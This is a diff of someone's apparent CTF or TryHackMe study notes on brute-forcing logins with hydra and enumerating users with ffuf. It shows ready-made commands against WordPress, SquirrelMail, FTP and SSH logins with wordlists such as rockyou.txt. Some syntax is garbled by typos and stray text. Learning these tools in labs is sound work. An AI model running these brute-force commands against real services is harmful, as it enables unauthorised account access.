@@ -44,7 +44,6 @@
 - -t = number threadlos
 - hydra MODULE -U
 
-
 - web
   - hydra -l USERNAME -P WORDLIST_FILE server *request-method* **"/[PATH_TO_LOGIN]:[body_request]:[F|S]=[ERROR_MESSAGE]"** -vV -f
     - F:failing strings
@@ -67,7 +66,6 @@
 hydra -l Elliot -P /usr/share/wordlists/rockyou.txt.gz $target http-post-form\n'/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.134.131%2Fwp-admin%2F&testcookie=1:ERROR: The password you entered for the username elliot is incorrect. Lost your password?'  -f
 
 hydra -l milesdyson -P log1.txt $target http-post-form '/squirrelmail/src/login.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown user or password incorrect.'\n
-
 ```
 
 - FTP
@@ -78,6 +76,13 @@ hydra -l milesdyson -P log1.txt $target http-post-form '/squirrelmail/src/login.
 
 - SSH
   - -L [USER_LIST] -P [PASS_LIST] ssh://IP -v
+
+## User enumeration
+-  fuff -w [wordlist] -X [Method] -d " username=FUZZ& data to be sent" -H "additional header request" -u "url" -mr "we are looking for this answer / match regex"
+   -  the *FUZZ* will be replaced by the items in the wordlist
+
+- ffuf -w [Wordlist1]:KeyWord1 , [Wordlist2]:KeyWord2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-w  ww-form-urlencoded" -u http://10.10.1.70/customers/login -fc 200j@fakemail.thm"
+- https://tryhackme.com/room/authenticationbypass
 
 ## Brutespray
 - Toll that uses result from nmap scan .xml
